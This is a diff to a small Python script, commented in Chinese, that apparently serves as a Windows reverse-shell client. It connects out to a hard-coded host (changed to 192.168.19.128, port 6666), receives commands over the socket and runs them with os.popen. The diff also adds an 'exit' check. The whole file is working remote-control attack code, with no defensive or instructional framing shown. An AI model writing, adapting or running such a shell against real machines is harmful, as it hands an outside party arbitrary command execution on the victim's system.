@@ -3,11 +3,11 @@
 适用win_shell
 """
 
-import os
+import os,sys
 from socket import *
 
-HOST = '127.0.0.1'  #目标地址IP
-PORT = 44444        #目标端口
+HOST = '192.168.19.128'  #目标地址IP
+PORT = 6666        #目标端口
 BUFSIZ = 2048
 ADDR=(HOST, PORT)
 client = socket(AF_INET, SOCK_STREAM)
@@ -15,7 +15,9 @@ client.connect(ADDR)
 
 while True:
     data = client.recv(BUFSIZ)
-    if data: 
+    if data:
+        if data == "exit":
+            sys.exit()
         PL = os.popen(data.decode('utf8'))
         os_result = PL.read()
         #print(os_result)
